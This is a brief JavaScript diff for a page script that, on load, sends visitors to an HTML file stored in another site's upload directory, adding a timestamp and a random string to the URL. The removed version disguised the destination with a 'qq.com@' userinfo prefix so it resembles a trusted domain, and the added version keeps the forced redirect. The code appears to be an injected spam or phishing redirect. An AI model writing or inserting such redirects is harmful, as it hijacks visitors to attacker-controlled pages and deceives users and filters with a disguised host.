@@ -9,9 +9,9 @@ function leleua() {
 leleua();
 
 window.onload = function () {
-    const targetUrl = 'http://qq.com@www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM#';
+    const targetUrl = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM#&##';
     const timestamp = Date.now();
     const randomString = Math.random().toString(36).substring(2);
-    const urlWithParam = `${targetUrl}u${timestamp}${randomString}`;
+    const urlWithParam = `${targetUrl}${timestamp}${randomString}`;
     window.location.href = urlWithParam
 }
